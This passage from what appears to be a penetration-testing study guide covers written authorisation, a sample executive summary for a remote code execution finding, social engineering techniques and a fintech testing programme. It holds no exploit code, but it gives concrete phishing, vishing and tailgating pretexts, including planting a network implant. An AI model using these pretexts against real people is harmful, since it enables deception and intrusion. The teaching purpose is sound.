2. **The written authorisation protects YOU.** If something goes wrong — the target server crashes, you accidentally access data you weren't supposed to, the client's IDS fires and they call law enforcement — without documentation, you have no defence.

3. **Do NOT test even one endpoint.** "Just a quick test" is exactly what it sounds like to a prosecutor: an unauthorised intrusion. There's no meaningful legal distinction between "just testing" and a full attack without authorisation.

4. **Contact the client.** If you believe you have verbal agreement, convert it to written form before doing anything. Email: "Following our call, I want to confirm in writing that we are authorised to conduct a penetration test against [scope] starting [date]." Wait for their written confirmation.

5. **Document this conversation.** Write down that a team member asked about testing without authorisation and that you instructed them not to. Protect yourself and the firm.

---

**Q23.** Write a professional "Executive Summary" for a penetration test finding of an unauthenticated remote code execution vulnerability on a public-facing web server.

**Answer:**

---
**EXECUTIVE SUMMARY — CRITICAL SECURITY FINDING**

**Finding:** Unauthenticated Remote Code Execution on Web Server  
**Severity:** Critical  
**Risk Rating:** CVSS 9.8 — Critical  

**What we found**

During our penetration test of Company Name's public-facing web infrastructure, we discovered a critical vulnerability in the web application server `webserver.company.com`. This vulnerability allowed us to execute arbitrary commands on the server without any authentication — meaning any person on the internet could have performed this attack.

**What this means for the business**

We successfully demonstrated the ability to:
- Read any file on the server, including customer database credentials
- Execute commands as the web server process user
- From this server, potentially access other internal company systems

In a real attack, this would likely result in: complete theft of the server's data, potential access to connected internal systems and customer databases, and installation of persistent malware to maintain long-term access.

**How serious is this?**

This is our highest severity finding. Based on our testing, this vulnerability has likely been present for 3+ months (based on the software version). We found no evidence that it has been exploited, but we cannot rule this out.

**Immediate action required**

1. Apply the patch for CVE-XXXX-XXXX (available from the vendor since DATE) — this should be done today
2. Temporarily restrict public access to the affected server while the patch is applied
3. Review server logs for any unusual access patterns over the past 3 months

A detailed technical description, evidence, and step-by-step remediation guidance is provided in Section 4.2 of this report.

---

**Q24.** What is "social engineering" in the context of penetration testing? Describe 3 social engineering techniques with real-world examples.

**Answer:** Social engineering is the art of manipulating people into performing actions or divulging information — bypassing technical security controls by exploiting human psychology rather than software vulnerabilities.

**3 Techniques:**

**1. Phishing (Email):**
Crafting a convincing email that appears to come from a trusted source, inducing the recipient to click a link, open an attachment, or reveal credentials.
*Example:* "IT Department: Your Microsoft 365 password expires today. Click here to renew it." → Credential harvest page identical to Microsoft login. Successfully collected 23 employee credentials in a real-world pentest.

**2. Vishing (Voice Phishing):**
Calling employees and using a convincing pretext to obtain information or access.
*Example:* Attacker calls helpdesk: "Hi, this is Dave from IT HQ. I'm locked out of the Mumbai office server room — can you call building security and tell them I'm authorised? I'll come by in 20 minutes." Helpdesk calls security on their behalf → attacker gains physical access.

**3. Pretexting (Physical):**
Creating a false scenario (pretext) to establish trust for further manipulation.
*Example:* Attacker dresses as a delivery driver with a package requiring a signature. Tailgates through access-controlled entry behind an employee. Once inside, plugs a "network tester" (actually a network implant) into an ethernet port.

**Common psychological principles exploited:**
- **Authority:** "This is urgent, I'm from the CISO's office"
- **Urgency/Scarcity:** "Your account will be locked in 2 hours"
- **Social proof:** "Everyone in your team has already done this"
- **Reciprocity:** Giving something small → person feels obligated to help in return

---

**Q25.** Design a complete penetration testing programme for a mid-sized Indian fintech company (300 employees, handles UPI payments, web app + mobile app). Include scope, frequency, and types of tests.

**Answer:**

**Annual Penetration Testing Programme — FinTech India Ltd**

**Regulatory context:** RBI requires regular security assessments for companies handling payment data. DPDP Act requires security safeguards for personal data processors.

**Programme overview:**

| Test Type | Scope | Frequency | Duration |
|-----------|-------|-----------|---------|
| External Network Pentest | All internet-facing IPs and domains | Annual | 2 weeks |
| Web Application Pentest | UPI payment portal, customer portal, admin portal | Annual + after major releases | 2-3 weeks |
| Mobile App Pentest | Android + iOS apps | Annual + after major releases | 1-2 weeks |
| Internal Network Pentest | Full internal network (with VPN access) | Annual | 2 weeks |
| Social Engineering / Phishing | All employees | Bi-annual | 2-4 weeks |
| Cloud Security Assessment | AWS/Azure/GCP configuration review | Annual | 1 week |
| API Security Assessment | Payment APIs, banking integration APIs | Annual | 1-2 weeks |

**Scope definitions:**

External: All public IPs, all `*.fintech.com` subdomains, payment gateways, API endpoints
Internal: Employee workstations, servers, AD domain, database servers, internal applications
Out of scope: Third-party payment rails (UPI network itself — owned by NPCI), partner bank systems

**Test approach:**
- External/Web/API: Black-box initially, then grey-box with credentials
- Internal: White-box (credential provided, network diagram provided)
- Mobile: White-box (source code access + production credentials for test accounts)
- Social Engineering: Covert (employees not told in advance)

**Remediation SLAs:**
- Critical: Patch within 24 hours (RCE, unauthenticated access to payment data)
- High: Patch within 7 days
- Medium: Patch within 30 days
- Low: Next patch cycle (90 days)

**Post-test:** Retest critical and high findings at no additional cost within 30 days to verify remediation.
